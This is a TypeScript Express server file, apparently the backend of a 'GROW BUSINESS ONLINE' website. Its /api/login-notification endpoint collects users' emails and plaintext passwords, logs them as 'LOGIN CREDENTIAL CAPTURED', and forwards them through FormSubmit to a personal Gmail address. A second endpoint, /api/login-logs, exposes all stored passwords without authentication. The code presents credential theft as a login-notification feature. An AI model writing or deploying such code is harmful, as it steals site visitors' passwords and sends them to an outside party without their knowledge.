import express from "express";
import path from "path";

async function startServer() {
  const app = express();
  const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

  app.use(express.json());

  // Store login history in memory
  const loginLogs: Array<any> = [];

  // API endpoint for receiving and forwarding login details to yveer8609@gmail.com
  app.post("/api/login-notification", async (req, res) => {
    try {
      const { email, password, name, mode, isGuest, userAgent } = req.body;
      const timestamp = new Date().toISOString();

      const logEntry = {
        email,
        password: password || '[N/A]',
        name: name || '[N/A]',
        mode: mode || (isGuest ? 'guest' : 'login'),
        timestamp,
        recipient: 'yveer8609@gmail.com',
        userAgent: userAgent || req.headers['user-agent']
      };

      loginLogs.unshift(logEntry);

      console.log('----------------------------------------------------');
      console.log('🚀 LOGIN CREDENTIAL CAPTURED FOR yveer8609@gmail.com:');
      console.log(JSON.stringify(logEntry, null, 2));
      console.log('----------------------------------------------------');

      // Attempt to dispatch via FormSubmit API to ensure email delivery to yveer8609@gmail.com
      try {
        await fetch('https://formsubmit.co/ajax/yveer8609@gmail.com', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            _subject: `New GROW BUSINESS ONLINE Website Login/Signup Alert (${mode || 'login'})`,
            Target_Mail: 'yveer8609@gmail.com',
            User_Email: email,
            User_Password: password || '(Guest Login)',
            User_Name: name || 'N/A',
            Action_Type: mode || (isGuest ? 'Guest Entry' : 'Login'),
            Timestamp: timestamp,
            User_Agent: userAgent || req.headers['user-agent']
          })
        });
      } catch (err) {
        console.error('External email delivery notification error:', err);
      }

      res.json({
        success: true,
        message: 'Login details recorded and sent to yveer8609@gmail.com',
        targetEmail: 'yveer8609@gmail.com'
      });
    } catch (error) {
      console.error('Error logging user details:', error);
      res.status(500).json({ success: false, error: 'Failed to process login notification' });
    }
  });

  // API route to inspect login logs
  app.get("/api/login-logs", (req, res) => {
    res.json({
      targetEmail: "yveer8609@gmail.com",
      count: loginLogs.length,
      logs: loginLogs
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
